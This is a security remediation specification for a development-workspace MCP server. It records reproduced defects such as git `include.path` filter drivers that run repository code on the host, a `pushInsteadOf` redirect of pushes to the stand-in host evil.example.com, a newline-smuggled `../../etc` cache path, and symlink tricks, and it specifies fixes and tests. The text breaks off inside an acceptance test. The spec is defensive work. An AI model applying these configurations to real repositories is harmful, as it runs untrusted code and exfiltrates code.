# Development Workspace MCP Server — Remediation Specification

**Status:** Draft
**Version:** 0.1
**Date:** 2026-08-28
**Source:** code review of `docs/HARDENING_TODO.md` (tasks H1–H35), 2026-08-28

## 1. Purpose

`docs/HARDENING_SPEC.md` specified thirty-three requirements (HR-001..HR-033)
closing defects a first review found in the original build. `docs/HARDENING_TODO.md`
implemented them as tasks H1–H35, all ticked complete.

A subsequent review of that hardening work found **eighteen defects in the
hardening itself**, including **two ticked checkboxes whose security control does
not hold**. This document specifies the requirements that close them.

Every defect below was **empirically reproduced against the running code** before
being written here — not inferred from reading, and not carried over from a
reviewer's summary. Each requirement records the reproduction so a future
implementer can re-run it rather than trust this document. That discipline is
itself a response to a finding: `docs/HARDENING_TODO.md`'s own H35 tracking table
contained a mis-citation and an inaccurate defect description that survived
because nobody re-ran them.

## 2. Relationship to `docs/SPEC.md` and `docs/HARDENING_SPEC.md`

`docs/SPEC.md` (v0.2) remains the authority for what the system does.
`docs/HARDENING_SPEC.md` remains the authority for *why* each hardening control
exists. This document is the authority for the defects listed here.

Where this document and either of the others disagree on a point this document
addresses, **this document governs until §16's amendments are applied**, after
which those documents govern again.

**R26 (`docs/REMEDIATION_TODO.md`) applied all four §16 amendments** —
`docs/SPEC.md` §24, §20.2, §18.7, §26 (bumping it to version 0.3), and
`docs/HARDENING_SPEC.md`'s HR-002, HR-014, HR-018, HR-026 (HR-016 was
already corrected earlier, by R8/RR-011). Precedence has returned to both
documents for every point §16 addressed; this document's own `RR-nnn`
numbering remains the reference for *why* each amendment exists and what
defect it closed.

Requirements here are numbered `RR-nnn` and acceptance tests `RAT-nnn`, to avoid
collision with `docs/SPEC.md`'s `FR-nnn`/`AT-nnn` and `docs/HARDENING_SPEC.md`'s
`HR-nnn`/`HAT-nnn`.

## 3. What this review established

The first review's framing (`HARDENING_SPEC.md` §3, HR-000) is retained in full:
anything reachable through repository content is also reachable by the client
directly, because `exec` grants arbitrary shell and `.git/` is container-writable
by default.

This review adds a second framing rule, which the two Critical findings share:

> **RR-000 (framing).** A control that is enforced in one execution context
> SHALL NOT be assumed to hold in another. This system has three distinct Git
> configuration scopes — the daemon's host-side reads (`GIT_CONFIG_GLOBAL=/dev/null`),
> the container's own environment (`/etc/gitconfig`, `$HOME/.gitconfig`), and the
> repository's `.git/config` — and a check performed in one scope constrains only
> that scope. Where a decision is made in one context and acted on in another, the
> **decision's resolved value**, not the input that produced it, SHALL be what
> crosses the boundary.

Both Critical defects are instances: H3 validated against a config view that did
not expand `include.path`, and H12 validated a URL host-side then pushed by
*remote name* in-container, where a different config re-resolved it.

A third observation, which drives §14, is not a security property but explains
the *pattern*:

> Of the eighteen defects, **thirteen have a passing test that was supposed to
> cover exactly that behavior.** In every case the test selected inputs that
> happened to already work: valid UTF-8 where invalid bytes were the risk, an
> untracked file where the tracked case was the risk, the two pathspec magic
> strings that were already safe, a monkeypatched `os.killpg` where the
> unreachable-daemon path was the risk. Coverage existed; adversarial input
> selection did not.

---

## 4. Host-side execution safety

### RR-001 Configuration discovery SHALL expand includes

`HARDENING_SPEC.md` HR-002(2) requires the daemon to enumerate the repository's
own configuration and neutralize every code-executing key. That enumeration
SHALL be performed with include expansion enabled (`git config --list --includes`),
for both the `--local` and `--worktree` scopes.

The property HR-002 states — *a host-side read cannot execute repository-supplied
code under the daemon's identity* — SHALL hold regardless of which configuration
mechanism defines the driver. `include.path` and `includeIf.*.path` are
configuration mechanisms; a driver reachable through them is reachable, and the
enumeration is not "complete with respect to what can actually run" without them.

*Defect (Critical, reproduced):* `git/service.py:126-128` runs
`git config --list -z --local` without `--includes`. Verified against git 2.43.0
that `--list --local` does not expand includes. End-to-end through the real code
path, with `.git/config` containing `[include] path = evil.cfg`, `.git/evil.cfg`
containing `[filter "sneaky"] clean = touch <marker>`, and `.gitattributes`
containing `* filter=sneaky`:

```
_discover_code_executing_overrides(repo)  ->  []          # discovers nothing
read_git_diff(repo)                       ->  marker exists: True
```

Repository-supplied code executed as the daemon uid through the real `git_diff`
read path. `--no-ext-diff --no-textconv` do not cover `filter.*`. The docstring
claim at `git/service.py:103-111` ("complete with respect to what can actually
run, because a driver that is not defined in configuration cannot be invoked") is
false as written — the driver *is* defined in configuration, just not in the
scope the probe reads.

*Additional hardening:* the environment scrub (`git/service.py:75-85`) SHALL also
remove `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>`, `GIT_CONFIG_VALUE_<n>`, and
`GIT_CONFIG_PARAMETERS`, which inject configuration directly and would defeat the
`GIT_CONFIG_GLOBAL=/dev/null` layer if the daemon's own environment were tainted.

---

## 5. Push destination integrity

### RR-002 The push SHALL be directed to the validated URL, not the remote name

`HARDENING_SPEC.md` HR-014 offered two remedies: resolve the push URL during
validation, **or** push to the validated URL string rather than the remote name.
Only the first was implemented, and it is insufficient on its own.

The daemon SHALL push to the **resolved, validated URL**. Where a structured push
is invoked by remote name, the daemon SHALL substitute the validated URL into the
invocation.

*Defect (Critical, reproduced):* validation runs host-side with
`GIT_CONFIG_GLOBAL=/dev/null` / `GIT_CONFIG_SYSTEM=/dev/null` (`git/service.py:238-240`),
so it sees only `.git/config`. The push runs **in-container by remote name**
(`git/push.py:109` — `argv.extend([remote, refspec])`, used at `tools/git.py:1006`),
where Git re-resolves the destination against the container's `/etc/gitconfig` and
`$HOME/.gitconfig`. `docker/default/entrypoint.sh:82` chowns `$HOME` to the
container user, so the container can write `~/.gitconfig`.

Verified against git 2.43.0, with `~/.gitconfig` containing
`[url "https://evil.example.com/evil/other.git"] pushInsteadOf = https://github.com/owner/repo.git`:

```
daemon's host-side validation view : https://github.com/owner/repo.git      <- approved
container's view                   : https://evil.example.com/evil/other.git
git push --dry-run                 -> https://evil.example.com/evil/other.git/
```

This is exactly the attack HR-014 exists to stop, and
`validate_remote_identity_for_push`'s own docstring names
`url.<base>.pushInsteadOf` as the threat. The resulting audit record names the
approved destination, not the one reached — an audit log that is affirmatively
wrong, which HR-014's own defect paragraph already called out as the worst
outcome.

*Residual:* even with the URL substituted, a concurrent `exec` can rewrite
`.git/config` between validation and invocation. Passing the resolved URL closes
the window because the resolved value crosses the boundary rather than a name
re-resolved on the far side (RR-000).

### RR-003 The audit record SHALL name the destination actually used

`HARDENING_SPEC.md` HR-014's third clause is unverified: no test asserts the
`git_push` success record's `remote_repository`, `refspec`, or
`remote_protection_status`. Each SHALL carry a test asserting the recorded value
matches what the operation actually did.

---

## 6. Structured-tool input integrity

### RR-004 `git_commit` SHALL reject a path that is not a path

`paths` entries SHALL be rejected when empty, or when they normalize to the
repository root (`""`, `"."`, `"./"`), with `INVALID_ARGUMENT`.

*Defect (High, reproduced):* `tools/git.py:385` validates only `if not paths:` —
a non-empty *list* containing an empty *string* passes. `_literal_pathspecs`
then produces the bare magic prefix:

```
build_add_argv([""])  ->  ['git', 'add', '--', ':(literal)']
```

Verified against real git 2.43: `git add -- ':(literal)'` stages the entire
working tree (`a.txt`, `dir/b.txt`, `dir/c.txt`). H21's headline property —
"stages exactly what it was told" — is defeated by an input the tool accepts.
`strict` mode happens to catch it (`normpath("") == "."`), but `strict` defaults
to `False`.

### RR-005 A failed commit SHALL restore the index, not reset it to HEAD

`HARDENING_SPEC.md` HR-025 requires a failed commit to leave the index unchanged.
The rollback SHALL restore each path's **prior index state**, not `HEAD`. Where
the prior state cannot be restored faithfully, the daemon SHALL NOT perform a
destructive rollback and SHALL report the index as left dirty.

*Defect (High, reproduced — data loss):* `git/commit.py:69-79`'s
`git reset -- <paths>` resets to HEAD. With the caller holding an out-of-band
staged change:

```
index BEFORE rollback: l1|STAGED|
index AFTER  rollback: l1|          <- caller's staged work destroyed
(HEAD is:              l1|)
```

The prose claims the empirical check confirmed "only `a.txt` is unstaged, leaving
any *other* already-staged path untouched" — true, but it verified the wrong
axis: other *paths* survive, the same path's prior *content* does not. The test
(`tests/workspace/test_git_commit_tool.py:680-710`) uses a previously-untracked
file, where reset-to-HEAD is coincidentally correct.

---

## 7. Error-model integrity

### RR-006 Every client-reachable filesystem failure SHALL be a typed `WorkspaceError`

No filesystem tool may surface a raw `OSError` subclass to the client.
`translate_workspace_errors` only catches `WorkspaceError`; anything else reaches
the client as an SDK crash with no `code`, no `recoverable`, and no `details`.

*Defect (High, reproduced):* H9's fd-based rewrite regressed three paths that
were previously typed:

```
read_file(missing)          -> FileNotFoundError   UNTRANSLATED -> SDK crash
write_file(onto a directory)-> IsADirectoryError   UNTRANSLATED -> SDK crash
delete_file(missing parent) -> FileNotFoundError   UNTRANSLATED -> SDK crash
```

All three returned `InvalidArgumentError` before H9 (`git show 4bfff54`). The
raw `os.open` at `security.py:97` and `security.py:111` raises before
`open_validated`/`delete_file` can classify. A consequence: the
`stat.S_ISDIR(os.fstat(fd))` check at `service.py:304-307` is now dead code —
an `O_RDWR` fd on a directory is unobtainable.

*Related:* `security.py:155-159` maps *every* `OSError` from the
`ensure_parent_directories` walk to `PathOutsideRepositoryError`, so
`write_file("f.txt/child", …)` reports "path escapes the repository root" for a
plain `ENOTDIR`. Error text SHALL describe the actual failure.

### RR-007 Enumeration SHALL survive any single unreadable entry

`HARDENING_SPEC.md` HR-012 requires that an escaping symlink not break
enumeration. That property SHALL extend to **every** per-entry failure mode,
including symlink loops, permission errors, and entries that vanish mid-walk. A
single bad entry SHALL be skipped or reported per-entry; it SHALL NOT abort the
listing.

*Defect (High, reproduced):* two mutually-referencing symlinks (trivially
creatable via `exec`) abort `list_files` entirely:

```
RuntimeError: Symlink loop from '/tmp/…/a'      UNTRANSLATED -> whole listing aborts
```

`Path.resolve()` raises `RuntimeError` — not `OSError`, not a `WorkspaceError` —
on ELOOP in CPython 3.12, so neither the `PathGitMetadataError` nor the
`PathOutsideRepositoryError` handler at `service.py:116-117` catches it.
`search_files` survives only incidentally, because `candidate.is_file()` is
`False` for a loop.

### RR-008 A diagnostic SHALL NOT be able to fail the operation it annotates

`verify_remote_protection`'s own docstring states it "degrades to `unverified` —
never raises", because §18.5 requires that a diagnostic feature not fail
`workspace_open` by itself. That contract SHALL hold for every response shape,
including a `200` whose body is not the expected type.

*Defect (High, reproduced — introduced by H32):* the rewrite to the unified rules
endpoint iterates the parsed body without a type guard
(`rule_types = {rule.get("type") for rule in rules}`). A `200` returning a JSON
*object* rather than an array:

```
*** RAISED AttributeError: 'str' object has no attribute 'get'
```

The exception escapes `verify_remote_protection`, escapes `workspace_open`, and
passes `translate_workspace_errors` uncaught. Reachable through a misconfigured
`api_base_url` (a GitHub Enterprise Server URL that resolves to a proxy or login
page returning `200`). This is the same class HR-022 exists to prevent.

---

## 8. Redaction correctness

### RR-009 Redaction SHALL recurse into nested containers and SHALL preserve types

The secret-key hint SHALL propagate into nested `dict` values exactly as it
already does into `list` values, and redaction SHALL NOT alter the type of a
value that carries no secret.

*Defect (Medium, reproduced):* H11 fixed the list branch and left the dict branch
one line above it unfixed, and the non-string-scalar fix over-applies because
`"key"` is a substring hint:

```
{'secret': {'a': 'hunter2'}}  ->  {'secret': {'a': 'hunter2'}}   <- LEAKS
{'ssh_key_present': True}     ->  {'ssh_key_present': '[REDACTED]'}
{'key_count': 3}              ->  {'key_count': '[REDACTED]'}
```

The first is a real leak of the exact shape H11 was written to stop. The latter
two silently convert booleans and integers to strings in `details` and audit
`metadata`; no current call site trips it, but the first `*_key_*` count or flag
anyone adds will be mangled.

---

## 9. Authorization coverage

### RR-010 Every workspace-scoped tool SHALL re-check authorization

`HARDENING_SPEC.md` HR-016's property SHALL cover tools scoped by `job_id` as
well as those scoped by `workspace_id`. A `job_id` resolves to a `workspace_id`,
which resolves to a `repository_id`; the re-check is available and SHALL be
performed.

*Defect (High, reproduced):* `exec_status_tool` (`tools/execution.py:510`),
`exec_output_tool` (`:518`), and `exec_cancel_tool` (`:626`) take only `job_id`
and never touch the registry, while `exec` (`:328`) and `exec_start` (`:434`)
both call `get_authorized`. After a repository is deauthorized, a client holding
a stale `job_id` can still read that job's captured stdout/stderr and cancel it.

### RR-011 "Live configuration" SHALL be defined honestly

`RepositoryRegistry` is constructed once at `server.py:55` and never reloaded, so
deauthorization takes effect only on daemon restart. Either the registry SHALL
re-read configuration, or HR-016's "immediately revokes access" and "live
configuration" SHALL be restated as restart-scoped. The current text describes a
stronger property than the code provides.

---

## 10. Lifecycle atomicity

### RR-012 `delete` SHALL NOT be able to wedge a workspace

`HARDENING_SPEC.md` HR-018's second clause — a failure SHALL NOT leave the
container removed and the row in `deleting` — SHALL hold for **every** failure
point, not only the `IntegrityError` it was written for. Best-effort cleanup
steps SHALL NOT sit between the destructive step and the row deletion.

*Defect (High, reproduced structurally):* `workspace/manager.py:653-661` orders
mark `DELETING` → remove container → **remove cache volumes** (can raise) →
**terminate ssh-agent** (can raise) → delete rows. `_remove_cache_volumes` raises
`ContainerRuntimeFailedError` on any `DockerException` — including
`409 volume is in use`, which is reachable because cache volumes are
*repository*-scoped and shared with every other workspace of that repository.
`ssh_agent.terminate` can raise `PermissionError` from `socket_path.unlink`.
Either leaves container gone and row in `DELETING`, **permanently**: a retry
re-enters, finds no container, and hits the same failure. H23 introduced the
volume-removal failure point into a method H16 had just made atomic.

### RR-013 A failed termination SHALL NOT be reported as a termination

`HARDENING_SPEC.md` HR-020's property SHALL hold when the Docker daemon itself is
unreachable, not only when the signal fails.

*Defect (Medium, reproduced structurally):* `execution/service.py:205-208`:

```python
try:
    info = self._docker.api.exec_inspect(exec_id)
except docker.errors.DockerException:
    return  # <- silent success
```

The docstring three lines above states "HR-020 requires a failed signal be
reported as a structured error, not silently swallowed". `_terminate` sees no
exception, `termination_failed` stays `False`, and `_run` marks the job
`CANCELED`/`TIMED_OUT` — a failed termination reported as success. This is also
the one remaining untranslated `DockerException` in the exec path that H19
subtask 1 claims to have closed. The test monkeypatches `os.killpg`, so the gap
is invisible.

### RR-014 `rebuild`/`reset` SHALL NOT adopt the container they are replacing

`_recreate` resolves the container to remove by `container_id`, so when the row's
`container_id` is `None` but a correctly-labeled container still occupies the
deterministic name, `_run_container` → `_adopt_or_remove_by_name` **adopts** it.
`reset` promises to discard environment state; `rebuild(image=…)` promises the
new image. Both silently return the stale container. Adoption SHALL be disabled
on the `_recreate` path.

*Related:* `_adopt_or_remove_by_name` propagates the adopted container's state, so
`ensure_workspace` can return a `STOPPED`/`FAILED` workspace with no `start()`.
An adopted container SHALL be started before being returned as ready.

### RR-015 The executor thread SHALL be genuinely bounded

`asyncio.wait_for` cancels the awaiting future, not the `to_thread` worker. A
stream that never EOFs holds an executor thread forever; the only mechanism that
frees it (`live.stream.close()`) runs *only on termination failure*, and the
`timeout_seconds is None` path has no bound at all. The drain SHALL be bounded by
closing the stream, not by abandoning the wait.

---

## 11. Output and pagination correctness

### RR-016 Byte-range pagination SHALL NOT split a character, under any content

`git_diff`'s window trimming SHALL produce a character-boundary-safe window even
when the window contains bytes that are not valid UTF-8 anywhere within it.

*Defect (High, reproduced):* `_trim_incomplete_trailing_char` inspects only the
**first** decode error. An invalid byte earlier in the window raises
`invalid start byte` with `exc.end != len(window)`, so the guard does not fire and
no trim happens:

```
window  = b'\xff\xe6\x97'          # 0xff, then 2 of the 3 bytes of 日
trimmed = b'\xff\xe6\x97'          # unchanged -> the character is split
```

This is not hypothetical: H19 deliberately introduced
`encode("utf-8", errors="surrogateescape")` at `git/diff.py:145` *so that
non-UTF-8 diff bytes survive* — invalid bytes are a designed-for input. Byte-level
reassembly stays lossless, but `content` is a `str`, so the client's text
reassembly is corrupted. The test uses valid UTF-8 only.

### RR-017 Pagination SHALL always make forward progress

A ranged read SHALL either advance `next_offset` or report completion. A request
that can never advance SHALL be rejected at validation.

*Defect (Medium, reproduced):* `git/diff.py:103-106` rejects only `max_bytes < 0`.
With `max_bytes=0`:

```
call1  next_offset=0  truncated=True
call2  next_offset=0  truncated=True     <- forever
```

This is precisely the "zero progress, forever" case H24's write-up claims was
eliminated. The guard SHALL be `< 1`.

### RR-018 A ranged read SHALL NOT misreport text as binary

`read_file` SHALL decode on a character boundary. A file whose byte limit falls
mid-character SHALL be reported as truncated text, never as binary.

*Defect (High, reproduced — regression):* `filesystem/service.py:202,221` reads
`limit + 1` bytes then calls `data.decode("utf-8")`. When the cut lands
mid-character:

```
max_read_bytes=10, file = b"a"*10 + "é".encode() + b"tail"
->  is_binary=True   content=None   truncated=False
```

An ordinary UTF-8 text file is reported as binary, its content dropped, and
`truncated=False` denies the client even the signal to retry with a range.
Pre-H29 code read the whole file, decoded cleanly, and truncated with
`errors="ignore"`. H29's write-up discloses only the *opposite* narrowing.

### RR-019 `read_log_tail` SHALL return whole lines

The backward-chunk read SHALL return at least `max_lines` **complete** lines. The
newline terminating the leading partial line SHALL NOT be counted toward the
requested total.

*Defect (High, reproduced):* `execution/log_capture.py:159` uses
`data.count(b"\n") >= max_lines`; `count()` includes the newline that terminates
the leading fragment, so at `count == max_lines` only `max_lines - 1` complete
lines follow, and `tail_text`'s `lines[-max_lines:]` returns the fragment as its
first line. At production defaults (`response_tail_lines=200`, 64 KiB chunk),
2 of 60 line-widths tested return a truncated fragment presented as a complete
log line — on **every poll** of a running job. The comparison SHALL be `>`.

### RR-020 A ranged read SHALL be bounded before reading

`read_file`'s `byte_range`/`line_range` path performs an unbounded `f.read()`.
`max_read_bytes` is a *response* cap, not a read cap, so
`read_file(path, byte_range=(0,1))` on a 10 GB in-repo file loads 10 GB into
memory. The `byte_range` case SHALL `seek`/`read` the requested span directly —
the slice is applied to raw bytes, so this is exactly equivalent. The
H29 rationale ("needs the full content decoded to slice at an arbitrary
position") is factually wrong for `byte_range`.

*Related:* `service.py:317-318`'s `os.pread(fd, existing_size, 0)` transfers at
most `0x7ffff000` bytes in one call, so any file over 2 GiB is hashed short,
producing a spurious `FILE_CONFLICT`. It SHALL loop, or stream as the no-range
path already does.

---

## 12. State reporting correctness

### RR-021 `oom_killed` SHALL reflect the current container

The flag SHALL be recomputed on every transition that changes which container the
record describes, and cleared when the workspace is observed running or stopped
cleanly. It is a current-state field, not a history flag.

*Defect (High, reproduced against real Docker — introduced by H32):* only
`reconcile` and the Docker-failure paths set `oom_killed`. `start()`, `stop()`,
`restart()`, and `_recreate` all preserve whatever was in the record:

```
AFTER OOM:               state=failed   oom_killed=True
AFTER SUCCESSFUL REOPEN: state=running  oom_killed=True    <- stale
```

A healthy running workspace reports `oom_killed: true` indefinitely, contradicting
the field's own docstring ("`False` again once the same container (or a
replacement) is observed running or stopped cleanly, not a sticky … history
flag") and `docs/SPEC.md` §26. Both H32 tests covered only the single
OOM→reconcile transition.

### RR-022 A running job SHALL have a pid, or its absence SHALL be surfaced

`ExecutionService.pid_of` returns `int | None`, so `mark_running(pid=None)` is
reachable. `mark_running`'s docstring promises the value is filled in "by a later
update" — but `mark_running` is the **only** writer of `pid` anywhere in the
codebase, so no such update exists. `update_output_counts`, which the docstring
alludes to, does not touch `pid` and has zero production call sites.

The daemon SHALL either retry `pid_of` until the exec reports one, or record the
absence explicitly so `reconcile_jobs`' liveness probe can report "unknown"
rather than silently reporting `pid_alive=False` and withholding the
orphaned-process warning that exists for exactly this case.

*Note:* `docs/TODO.md`'s S15 correction currently asserts this race does not
exist. That assertion is wrong and is amended by §16.

### RR-023 Transport failure classification SHALL distinguish auth from local failure

`is_auth_failure` SHALL match only wording that genuinely indicates a rejected
credential. A local filesystem failure SHALL surface as an ordinary command
failure, per the same rule `git/pull.py`'s `is_non_fast_forward_failure` docstring
already states for its own narrower case.

*Defect (High, reproduced — introduced by H32):* the bare substring
`"Permission denied"` matches local errors:

```
error: cannot open '.git/FETCH_HEAD': Permission denied        -> GIT_AUTH_FAILED
fatal: could not create leading directories: Permission denied -> GIT_AUTH_FAILED
warning: unable to unlink .git/x: Permission denied            -> GIT_AUTH_FAILED
```

`GitAuthFailedError` carries `default_recoverable = False`, so a fixable local
permission problem is reported to the client as a permanent credential failure.
Reachable through the documented, supported `git_dir_mode: read-only` (§18.2),
under which the container cannot write `.git` and every `git_pull` fetch produces
this class of error. OpenSSH's actual wording carries a parenthetical
(`Permission denied (publickey).`); anchoring on that, or on SSH context,
distinguishes the two.

---

## 13. Test and build integrity

### RR-024 Test teardown SHALL remove only what the test created

`HARDENING_SPEC.md` HR-026's property is not met for volumes.
`tests/workspace/conftest.py:78-80` records every volume-type mount *referenced*
in `run()` kwargs — not those this process created — and teardown
`remove(force=True)`s them. Because every test hard-codes repository id
`"example"` and `cache_volume_name` is deterministic, a real deployment on the
same host serving a repository `example` with a `cargo` cache **loses that volume
and its contents to a suite run**.

Teardown SHALL track creation, not reference. Until it does, the suite SHALL use
a per-run unique repository id so the deterministic name cannot collide with a
production volume.

### RR-025 An assertion SHALL NOT restate its subject's own postcondition

A test whose only assertion is a condition the code under test guarantees by
construction verifies termination, not correctness.

*Defect (reproduced):* `tests/execution/test_log_capture.py:205-218`'s sole
assertion is `tail.count(b"\n") >= 5` — literally the loop's exit condition at
`log_capture.py:159`. It cannot fail while the loop terminates, and never checks
the returned bytes are the correct last five lines. It would not catch RR-019.

This is the HR-027 anti-pattern ("coverage checks SHALL NOT satisfy themselves")
recurring **two tasks after** the task that fixed it, which is why it needs a
standing requirement rather than a one-time correction.

*Related:* `tests/git/test_service.py:227-238` asserts only that a marker file was
not created, and passes even though `git -c diff.external= diff` exits 128 with
`fatal: external diff died` — a read that fails is indistinguishable from a read
that was safely neutralized. H3's own subtask forbids exactly this.

### RR-026 Coverage SHALL be selected adversarially

For each requirement, the test SHALL exercise the input class that motivated it,
not a representative that happens to be safe. Concretely, the following
currently-passing tests do not constrain their stated property, and each SHALL be
strengthened:

| Property | Test uses | SHALL use |
|---|---|---|
| Character-safe pagination (RR-016) | valid UTF-8 only | content with invalid bytes (H19's own `surrogateescape` case) |
| Index rollback (RR-005) | an untracked file | a path with prior staged content |
| Pathspec literalization (RR-004) | `:/`, `:(glob)**` | `""`, `"."`, `"./"` |
| Failed termination (RR-013) | monkeypatched `os.killpg` | unreachable Docker daemon — **accepted substitution** (V7, `docs/REVIEW_TODO.md`/`docs/REVIEW_SPEC.md` VR-008): the test that closed this row (`test_rr013_failed_termination_via_a_real_exec_inspect_failure`) removes the container so a real `exec_inspect` 404s, rather than mocking an unreachable daemon — a real failure from a real Docker daemon, arguably a stronger adversarial input than the one named here, not a gap |
| Enumeration resilience (RR-007) | escaping symlink | symlink loop, permission error |
| Tail correctness (RR-019) | whole-file reads (`read_from == 0`) | a nonzero backward offset |
| Text/binary classification (RR-018) | ASCII only | multi-byte character at the limit boundary |

### RR-027 Reverting a fix SHALL fail a test

The following are implemented but unconstrained — deleting the fix leaves the
suite green. Each SHALL gain a test that fails on the reverted code:

- `--end-of-options` placement (`git/diff.py:125`, `git/log.py:96`) — every
  existing test uses a leading-`-` value, which trips `validate_revision_argument`
  first, so the second layer is untested.
- `patch_file`'s `expected_sha256` pass-through (`tools/filesystem.py:255-257`).
- Tracked cache-volume removal (`conftest.py:123-125`) — only the "untracked
  sentinel survives" direction is tested.
- `git_push` success-record `refspec` / `remote_protection_status` (RR-003).

### RR-028 The contract-version check SHALL be order-insensitive and monotonic

`.github/workflows/ci.yml:102-104` uses `jq -S .tools`, which sorts object keys
but preserves array order, so a pure reordering of the tool array falsely demands
a version bump. A version *downgrade* also passes. The comparison SHALL sort the
array by tool name, and the check SHALL reject a **decrease** in version.
(**Corrected wording** — V7, `docs/REVIEW_TODO.md`/`docs/REVIEW_SPEC.md`
VR-010: this requirement previously said "reject a non-increasing version",
which would also reject an *unchanged* version and fail every no-op commit.
Rejecting only a decrease — what the shipped `sort -V | tail -1` check and
R25's implementation both actually do — is the correct requirement.)

---

## 14. Entrypoint and container-identity integrity

### RR-029 The entrypoint SHALL reject every malformed cache entry

`docker/default/entrypoint.sh:100`'s `IFS=':' read -ra` consumes only the first
line of its input. Verified in bash: `MCP_CACHE_PATHS=$'.cargo\n../../etc'`
silently drops `../../etc` — no rejection, no mount. A trailing colon
(`.cargo:`) is likewise dropped, while a leading or middle empty field is
correctly rejected. The write-up claims the script "exits non-zero rather than
silently skipping the bad entry, since a silent skip would hide a
misconfiguration"; it does not. Parsing SHALL reject any entry containing a
newline and SHALL treat leading, middle, and trailing empties identically.

### RR-030 Cache path preparation SHALL NOT follow symlinks

`entrypoint.sh:119-120` does `mkdir -p "$HOME_DIR/$cache_path"` then `chown`
(no `-h`), both following symlinks, as root before the identity drop. A cache
volume persists across runs and is container-writable, so a symlink planted
inside one cache's volume can redirect a later, `..`-free cache path outside
`$HOME`. Preparation SHALL resolve under `$HOME` or operate per-component with
`-h`.

*Related:* `entrypoint.sh:90-98`'s comment states `MCP_CACHE_PATHS` "can also be
set directly through a project's own `environment:`… reaching this script
unvalidated". H6's validator now rejects every `MCP_*` key at project-config
load. The comment SHALL be corrected.

### RR-031 Every daemon-controlled variable SHALL be merged last

`MCP_CACHE_PATHS` is daemon-computed but injected *through* `extra_env`
(`tools/workspace.py:416-418`, `cli.py:265-267`), and
`build_workspace_run_kwargs` merges `extra_env` **first**
(`workspace/container_config.py:103,108`), with only
`MCP_UID`/`GID`/`SUDO`/`WORKSPACE_PATH`/`SSH_MODE`/`SSH_AUTH_SOCK` last. The
dict-overwrite is additionally guarded by `if resolved_caches:`. H6's stated
property — "ordering alone cannot produce an override even if the filter is
bypassed" — SHALL hold for `MCP_CACHE_PATHS` too. Not exploitable today only
because H6's filter and H8's re-validation both stand.

---

## 15. Documentation truth

### RR-032 `docs/SPEC.md` §24 SHALL describe the logging that exists

The §24 amendment applied by H34 states that a file write, a file delete, and a
job cancellation "are logged operationally (§13, HR-031)". Verified: neither
`tools/filesystem.py`, `filesystem/service.py`, nor `tools/execution.py` contains
a logger at all. Only container lifecycle is logged. Three of the four claims are
false, in the direction of overclaiming — introduced by the task whose stated
purpose was eliminating documentation overclaims.

Either those events SHALL be logged, or the sentence SHALL be corrected.

### RR-033 A tracking table SHALL be verified before it is cited

`docs/HARDENING_TODO.md`'s H35 table carried two inaccuracies that survived into
a completed task because they were transcribed rather than re-run: an S31 row
citing H32 for pid-exhaustion detection (H32 never touched it), and an S9/S10 row
describing rule 3 as "fails open" when the request is in fact still refused, just
with a less specific error code. Both were caught only by re-verification.

A correction that cites a closing task SHALL name a task that demonstrably closes
it, and a defect description SHALL be reproduced before it is written down.

---

## 16. Required amendments to existing documents

These SHALL be applied. Each is a defect in the documentation itself.

| Document | Section | Defect | Amendment |
|---|---|---|---|
| `SPEC.md` | §24 | Claims file write/delete and job cancellation are logged operationally; no logger exists in those modules. | State that only container lifecycle, job reconciliation, ssh-agent lifecycle, and policy denials are logged; list the rest as unimplemented. |
| `SPEC.md` | §20.2 | Requires resolving the push URL, but not that the push *use* it. | Add RR-002: the daemon SHALL push to the validated URL, not the remote name. |
| `SPEC.md` | §18.7 | The four-part control's part 2 does not state that enumeration must expand includes. | Add RR-001's `--includes` requirement and the `GIT_CONFIG_*` env additions. |
| `SPEC.md` | §26 | Describes `oom_killed` without stating it is current-state, not history. | State that the flag is recomputed on every container-identity transition and cleared on clean observation. |
| `HARDENING_SPEC.md` | HR-002 | "Complete with respect to what can actually run" is false without `--includes`. | Correct the completeness claim and cite RR-001. |
| `HARDENING_SPEC.md` | HR-014 | Both remedies presented as alternatives; only the second is sufficient. | State that resolving the URL is necessary but not sufficient, and that the push SHALL use it. |
| `HARDENING_SPEC.md` | HR-016 | "Immediately revokes access" / "live configuration" overstate a restart-scoped snapshot. | Restate as restart-scoped, or require registry reload (RR-011). |
| `HARDENING_SPEC.md` | HR-018 | Its own second clause is unimplemented. | Note the remaining failure points and cite RR-012. |
| `HARDENING_SPEC.md` | HR-026 | "Every removal targets an identity this process itself watched get created" is false for volumes. | Correct to "referenced", and cite RR-024. |
| `HARDENING_TODO.md` | H35 table (S31) | Cites H32 for pid-exhaustion detection; H32 never addressed it. | Remove the citation; mark unowned. |
| `HARDENING_TODO.md` | H35 table (S9/S10) | "Fails open" is inaccurate. | Restate as an error-classification gap; cite H37. |
| `TODO.md` | S15 correction | Asserts the `pid=None` race does not exist; it does. | Correct, and cite RR-022. |
| `TODO.md` | S29 correction | — | No change; verified accurate. |

---

## 17. Acceptance tests

Each SHALL be an automated test. Tests marked **(adversarial)** SHALL use the
input class named in RR-026, not a safe representative.

### RAT-001 Included configuration cannot execute code
A repository defining `filter.<name>.clean` via `include.path` SHALL NOT execute
it during any host-side read. **(adversarial)**

### RAT-002 Included configuration is discovered
`_discover_code_executing_overrides` SHALL return the driver key defined through
`include.path` and through `includeIf.*.path`.

### RAT-003 A redirected push does not reach the redirect
With `pushInsteadOf` set in a container-writable config scope, a structured push
SHALL either reach the validated destination or fail — never reach the redirect.

### RAT-004 The audit record names the destination used
A successful `git_push` SHALL produce an audit record whose `remote_repository`
matches the destination actually contacted.

### RAT-005 An empty path is refused
`git_commit(paths=[""])`, `["."]`, and `["./"]` SHALL each raise
`INVALID_ARGUMENT` and stage nothing. **(adversarial)**

### RAT-006 A failed commit preserves staged content
With a path holding prior staged content distinct from HEAD, a failed commit
SHALL leave that content staged. **(adversarial)**

### RAT-007 Filesystem errors are typed
`read_file` on a missing path, `write_file` onto a directory, and `delete_file`
with a missing parent SHALL each raise a `WorkspaceError`.

### RAT-008 A symlink loop does not abort enumeration
`list_files` and `search_files` SHALL both complete over a directory containing
mutually-referencing symlinks. **(adversarial)**

### RAT-009 A malformed protection response degrades
`verify_remote_protection` against a `200` returning a JSON object SHALL return
`unverified` and SHALL NOT raise. **(adversarial)**

### RAT-010 Redaction recurses and preserves types
A secret nested in a dict under a secret-hinted key SHALL be redacted; a boolean
or integer under a `*key*`-hinted name SHALL retain its type.

### RAT-011 Job-scoped tools re-check authorization
After deauthorization, `exec_status`, `exec_output`, and `exec_cancel` on a
